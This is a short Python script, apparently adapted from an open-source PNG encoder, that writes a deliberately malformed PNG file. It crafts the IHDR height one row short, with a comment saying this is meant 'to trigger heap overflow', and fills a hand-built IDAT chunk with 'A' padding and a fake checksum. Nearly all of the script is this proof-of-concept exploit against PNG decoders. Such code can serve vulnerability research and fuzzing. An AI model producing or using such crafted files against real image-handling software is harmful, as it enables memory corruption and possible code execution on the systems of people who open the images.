# Based on source code png-encode by Eric Zheng
# https://github.com/eeeeeric/png-encode

import io
import struct
import zlib

PNG_HEADER = b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'

# Chunk encoding
# Length (4B) + Chunk Type (4B) + Chunk data (length B) + CRC (4B)
# CRC is computed over the chunk type and chunk data, but not length
CHUNK_HEADER    = '!IBBBB'
CHUNK_META	= '<BBBHBB'
CHUNK_TRAILER   = '!I'

Z_DEFLATED	= 8
PNG_FILTER_VALUE_NONE	= 0

# Critial chunks: IHDR, IDAT, IEND

# IHDR
# Width:              4 bytes
# Height:             4 bytes
# Bit depth:          1 byte
# Color type:         1 byte
# Compression method: 1 byte
# Filter method:      1 byte
# Interlace method:   1 byte
IHDR_CHUNK      = '!IIBBBBB'

_BIT_DEPTH      = 8
_COLOR_TYPE     = 2
_COMPRESSION    = 0
_FILTER         = 0
_INTERLACE      = 0


def _crc32(data):
    return zlib.crc32(data) & 0xFFFFFFFF

def PNGAddFilter(data, width, height, bpp):
	
    IDAT_DATA = str()
    row_bytes = width * bpp

    for x in range(len(data)):
	if x % row_bytes == 0:
	    IDAT_DATA += chr(PNG_FILTER_VALUE_NONE)
        IDAT_DATA += data[x]

    return IDAT_DATA

def PNGEncode(data, width, height, bpp):

    png = io.BytesIO()
    png.write(PNG_HEADER)

    # IHDR
    IHDR  = struct.pack(CHUNK_HEADER, struct.calcsize(IHDR_CHUNK), ord('I'), ord('H'), ord('D'), ord('R'))
    # (height - 1) to trigger heap overflow
    IHDR += struct.pack(IHDR_CHUNK, width, height - 1, _BIT_DEPTH, _COLOR_TYPE, _COMPRESSION, _FILTER, _INTERLACE)
    IHDR += struct.pack(CHUNK_TRAILER, _crc32(IHDR))
    png.write(IHDR)

    # IDAT
    data_len = len(data) + width
    IDAT  = struct.pack(CHUNK_HEADER, len(data) + struct.calcsize(CHUNK_META) + width + 4, ord('I'), ord('D'), ord('A'), ord('T'))
    IDAT += struct.pack(CHUNK_META, Z_DEFLATED, 1, 1, data_len, 0, 0)
    IDAT += PNGAddFilter(data, width, height, bpp)
    IDAT += "BBBB"	# adler checksum
    IDAT += struct.pack(CHUNK_TRAILER, _crc32(IDAT))
    png.write(IDAT)

    # IEND (Empty data)
    IEND = struct.pack(CHUNK_HEADER, 0, ord('I'), ord('E'), ord('N'), ord('D'))
    IEND += struct.pack(CHUNK_TRAILER, _crc32(IEND))
    png.write(IEND)

    return png.getvalue()

width = 32
height = 32
bpp = 3

output = open("png_oob_write_idat.png", "wb")
output.write(PNGEncode("A" * width * height * bpp, width, height, bpp))
